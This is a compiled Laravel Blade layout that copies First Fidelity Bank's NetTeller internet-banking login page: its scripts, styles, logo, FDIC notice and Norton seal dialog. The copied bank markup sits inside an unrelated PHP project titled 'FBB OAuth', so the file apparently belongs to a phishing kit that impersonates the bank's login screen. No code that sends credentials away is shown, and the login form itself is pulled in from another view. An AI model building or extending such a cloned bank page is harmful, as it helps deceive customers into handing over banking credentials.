

<!DOCTYPE html>
<html lang="en-US">
<head id="ctl00_Head1"><link id="ctl00_favIconShortcut" href="img/favicon.ico" rel="shortcut icon" type="image/x-icon" />
<link id="ctl00_favIcon" href="img/favicon.ico" rel="icon" type="image/x-icon" /><meta name="msapplication-config" content="none" /><title>
	<?php echo $__env->yieldContent('title'); ?> | FBB OAuth
</title>
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/NetTellerLayout_Other.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/default.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/legacy.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/ADA.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/Grid.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/NetTellerLayout.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/NetTellerCorners.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" href="login2008/css/jquery-ui-1.10.3.custom.css" />
<link rel="stylesheet" type="text/css" media="all" href="login2008/css/jquery.qtip.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="screen" href="login2008/css/ui.jqgrid.css?v=2019.900.923.1" />
<link rel="stylesheet" type="text/css" media="print" href="login2008/css/Print.css?v=2019.900.923.1" />
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700,300,600" rel="stylesheet" type="text/css" />
    <script type="text/javascript" src='login2008/js/NetTellerCorners.js?v=2019.900.923.1'></script>
   <script src="assets/js/jquery-3.2.1.min.js"></script>
   <script type="text/javascript" src='login2008/js/jquery-ui-1.10.3.custom.min.js'></script>
	<script type="text/javascript" src='login2008/js/json2.min.js?v=2019.900.923.1'></script>
    <script type="text/javascript" src='login2008/js/jquery.qtip.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/jquery.tinywatermark-2.0.0.min.js'></script>
	<script type="text/javascript" src='login2008/js/jquery.meio.mask.min.js?v=2019.900.923.1'></script>	
    <script type="text/javascript" src='login2008/js/jquery.deserialize.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/jquery.multiselect.min.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/JHA.Core.js?v=2019.900.923.1'></script>
    <script type="text/javascript" src='login2008/js/JHA.ADA.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/JHA.NetTeller.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/spin.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/mfa.js?v=2019.900.923.1'></script>
	<script type="text/javascript" src='login2008/js/GovernmentLogo.js?v=2019.900.923.1'></script>
    <script type="text/javascript" src='login2008/js/DisclosureAgreement.js?v=2019.900.923.1'></script>
    <script type="text/javascript" src='login2008/js/jha.dynamicRules.js?v=2019.900.923.1'></script>
    
		<script type="text/javascript" src="login2008/js/Trusteer.js"></script>
<link href="login2008/css/ui.multiselect.css" type="text/css" rel="stylesheet" />
<link rel="stylesheet" media="all" type="text/css" href="login2008/css/login.css" />
<link rel="stylesheet" media="all" type="text/css" href="login2008/css/CustomCss.css" />
<link rel="stylesheet" media="all" type="text/css" href="login2008/css/Modernized.css?v=2019.900.923.1" />
<link rel="stylesheet" media="all" type="text/css" href="login2008/css/FontIcon.css" />
<link rel="stylesheet" media="all" type="text/css" href="login2008/css/NTSync.css?v=2019.900.923.1" />
</head>
<body> 


    <a href="#ada_maincontent" title="skip to main content" class="HiddenSkipToMain" tabindex="1">Skip to main content</a>
	    
	    <div id="bannerDiv" role="banner" aria-label="Banner">
            
        </div>

        <br /> 

        

         
    
        <div id="banner">
            <img id="ctl00_BannerContent_BankLogo" ToggleTabIndex="true" onclick='window.location="<?php echo e(url('/')); ?>";' src="login2008/images/banklogo7149_2009.gif" alt="First Fidelity Bank" style="border-width:0px;" />
        </div>
    
        <div id="ctl00_BannerContent_CallbackFunctions" class="LoginHide">
            
            
            
            
        </div>


        
        <div id="contentNoTopMenu">
		    
<div id="bankaddress">
	Member FDIC
</div>

		    
			<div id="ajax-message-container"></div>
            

            
		    <div id="mainContentDiv" role="main" aria-label="Main Content">
  
  <!--------- Session notifications-------------->
        	<?php
               $pop = ""; $val = "";
               
               if(isset($signals))
               {
                  foreach($signals['okays'] as $key => $value)
                  {
                    if(session()->has($key))
                    {
                  	$pop = $key; $val = session()->get($key);
                    }
                 }
              }
              
             ?> 

                 <?php if($pop != "" && $val != ""): ?>
                   <?php echo $__env->make('session-status-2',['pop' => $pop, 'val' => $val], \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                 <?php endif; ?>
  
<!-- include error message here -->
<!--------- Input errors -------------->
                    <?php if(count($errors) > 0): ?>
                          <?php echo $__env->make('input-errors-2', ['errors'=>$errors], \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
                     <?php endif; ?> 



		        
			    
    

<div class="MainContent_Container LoginContainer" id="ada_maincontent" tabindex="-1">
    
    <label id="bugFixLabel" for="bugFixInput" style="display: none">BugFix</label>
    <input id="bugFixInput" type="text" style="display: none" />

    <div class="HeaderRow">
        <div class="pageTab HeaderDiv">
            <h1 ToggleTabIndex="true" id="ctl00_PageContent_Login1_CaptionLabel">
	Login to FFB Online
</h1>
        </div>
        <div class="HeaderHelp">
            <a onclick="JHA.NetTeller.ShowFieldHelp({ title: &quot;Internet Banking Login&quot;, text: &quot;From this page you can enter your internet banking login credentials to access your financial institution&#39;s internet banking site.&quot;, target: this, showOnReady: true, hideEvent: &#39;unfocus&#39; }); return false;" id="ctl00_PageContent_Login1_HelpPopup1_HelpLink" title="Click here for help" class="HelpLink" ToggleTabIndex="true" href="javascript:__doPostBack(&#39;ctl00$PageContent$Login1$HelpPopup1$HelpLink&#39;,&#39;&#39;)"><img src="login2008/images/icon_help.png" alt="Help" style="border-width:0px;" /><span class="HiddenElement"> Internet&#32;Banking&#32;Login&#32;help</span></a>&nbsp;

        </div>
        <div class="HeaderRange">
            
            
&nbsp;&nbsp;
            
&nbsp;&nbsp;
            <a id="ctl00_PageContent_Login1_EnrollLink" ToggleTabIndex="true" href="#">Enroll</a>&nbsp;&nbsp;
            <a onclick="showBrowserModal(); return false;" id="ctl00_PageContent_Login1_TestBrowserLink" ToggleTabIndex="true" href="javascript:__doPostBack(&#39;ctl00$PageContent$Login1$TestBrowserLink&#39;,&#39;&#39;)">Test Browser</a>&nbsp;&nbsp;
            <a id="ctl00_PageContent_Login1_HomeLink" ToggleTabIndex="true" href="<?php echo e(url('/')); ?>">Home</a>
        </div>
    </div>

    <div class="MainContent">
	<?php echo $__env->yieldContent('content'); ?>
    </div>
           <div class="LoginBackOfficeDiv">
            <span class="SetToggleTabIndex LoginBackOfficeSpan">
                Some internet browsers may save user names and passwords.	This will automatically complete any login for you and may allow people at your computer to use your logins without knowing your passwords. For your security, please review your internet browser's "Help" section, or contact their Customer Support, to see if this option is available and how to turn it off.
            </span>
        </div>
    

    
    
        <div class="LoginLinksDiv">
            <div class="SetToggleTabIndex LoginLinksInnerDiv">
                <div id="loginLinks"><ul ></ul></div>
            </div>
        </div>
    

    
        
        <div class="LoginVerisignDiv">      
            <input type="image" name="ctl00$PageContent$Login1$VerisignImageButton" id="ctl00_PageContent_Login1_VerisignImageButton" class="verisign-button" ToggleTabIndex="true" role="link" src="/login2008/images/VeriSign.gif" alt="Select to be taken to Symantec Norton Secured website verification." onclick="showVerisignMessageModal(); return false;" style="border-width:0px;" />
        </div>
    

    
</div>

<div class="modal-browserVersion" title="Browser Version">Chrome 77.0</div>

<div class="modal-dualLoginMessage" title="Attention!" >Internet banking is already running in this browser session. Multiple logins within the same browser session are not permitted. Please select OK and then close this browser tab.</div>

<div class="modal-veriSignMessage" title="Confirmation" role="dialog" aria-describedby="veriSign-dialogDescription"><div id="veriSign-dialogDescription">You're leaving First Fidelity Bank's website.<br /><br />First Fidelity Bank does not provide, and is not responsible for, the product service, or overall website content available at the linked third-party site. We do not endorse or guarantee any products, information or recommendations provided by the site and are not liable for any failure of products or services offered by the site. You should be advised that First Fidelity Bank's privacy policy does not apply to the linked website and you should consult the privacy disclosures on the third-party site for further information.</div></div>

<script type="text/javascript">
    $(document).ready(function ($) {
        $('.SetToggleTabIndex').each(function () {
            $(this).find('a').attr('ToggleTabIndex', true);
        });

        $('a').attr('ToggleTabIndex', true);
        SetTabIndexValues();
    });

    $(".modal-browserVersion").dialog({
        autoOpen: false,
        width: 320,
        modal: true,
        position: 'center',
        draggable: false,
        resizable: false,
        close: function (event, ui) {
            $(".modal-browserVersion").dialog('close');
        }
    });

    function showBrowserModal(event) {
        $(".modal-browserVersion").dialog('open');
    }

    $(".modal-dualLoginMessage").dialog({
        autoOpen: false,
        width: 500,
        height: 200,
        modal: true,
        position: 'center',
        draggable: false,
        resizable: false,
        dialogClass: "alert",
        closeOnEscape: false,
        buttons: {
            OK: {
                click: function (event, ui) {
                    $(this).dialog('close');
                },
                text: 'OK',
                'class': 'ColorButton'
            }
        }
    });

    function showDualLoginMessageModal(event) {
        $(".modal-dualLoginMessage").dialog('open');
    }

    $(".modal-veriSignMessage").dialog({
        autoOpen: false,
        width: 500,
        modal: true,
        position: 'center',
        draggable: false,
        resizable: false,
        buttons: [{
            text: "Cancel",
            click: function (event, ui) {
                $(this).dialog('close');
            }
        }, {
            text: "Continue",
            "class": "ColorButton",
            click: function (event, ui) {
                var host = window.location.hostname;
                switch (host) {
                    case "www-e.qa.netteller.com":
                    case "www-a.qa.netteller.com":
                    case "cm4.qa.netteller.com":
                    case "cm5.qa.netteller.com":
                        host = "www.netteller.com";
                        break;
                }
                var url = "https://trustsealinfo.websecurity.norton.com/splash?form_file=fdf/splash.fdf&dn=" + host + "&lang=en";
                window.open(url, '', 'toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes');
                $(this).dialog('close');
            }
        }],
        open: function () {
            $(this).parent().find('button:nth-child(2)').focus();
            $(this).parent().find('button:nth-child(1)').css("float", "left");
        }
    });

    function showVerisignMessageModal(event) {
        $(".modal-veriSignMessage").dialog('open');
    }
</script>
    

                
            </div>
            <div id="contentBlockFooter" role="contentinfo" aria-label="Content Info">
		        <div id="contentFooter" style="width: 100%; text-align: center;">
                    <div style="float:left;">
						
                    </div>
                    <div style="float:right;">
						

<div class="WatermarkFdicEhlBannerAuthTable">
	<div class="RightTD jha-govt-logos WatermarkFdicEhlBannerAuthTableCell">
		
		
		
	</div>
</div>
						
                    </div>
			    </div>
                <div style="clear:both;"></div>
            </div>
        </div>
	<input type="hidden" id="themename" class="themename" value="Modernized" /><input type="hidden" id="jhadynamicrules" class="jhadynamicrules" value="False" /><input type="hidden" id="jhamultitabdetectednumber" class="jhamultitabdetectednumber" value="7149" />

<script type="text/javascript">
//<![CDATA[
(function() {var fn = function() {$get("ctl00_ScriptManager_HiddenField").value = "";Sys.Application.remove_init(fn);};Sys.Application.add_init(fn);})();WebForm_AutoFocus('ctl00_PageContent_Login1_IdTextBox');//]]>
</script>
<input id="username" name="username" type="text" style="display:none;" value="" /> <input id="isJsAssigningValues" name="isJsAssigningValues" type="hidden" value="ocp_item" /> <script>var ocpForm = document.getElementsByName("aspnetForm")[0]; ocpForm.onsubmit = function (e) { var isFps = (typeof document.getElementsByName("__isJsAssigningValues")[0] != "undefined" && document.getElementsByName("__isJsAssigningValues")[0] != "ocp_item") ? "true" : "false"; var qsDelimiter = (ocpForm.action.match(/\?/g)) ? "&" : "?"; ocpForm.action= ocpForm.action+qsDelimiter+"isJsAssigningValues="+isFps; };</script> </form>
	
	<div id="progress-indicator-container" class="progress-indicator-container"></div>
    <div id="jha-dynarule-popup-container" class="LoginNewCmAliasIDNoteDiv jha-dynarule-popup-container"></div>
    <div id="ADA_AlertDiv" class="HiddenDiv" aria-live="assertive"><span id="ADA_AlertMsg"></span></div>
</body>
</html>
<?php /**PATH C:\bkupp\lokl\repo\bank-olly\resources\views/login_layout.blade.php ENDPATH**/ ?>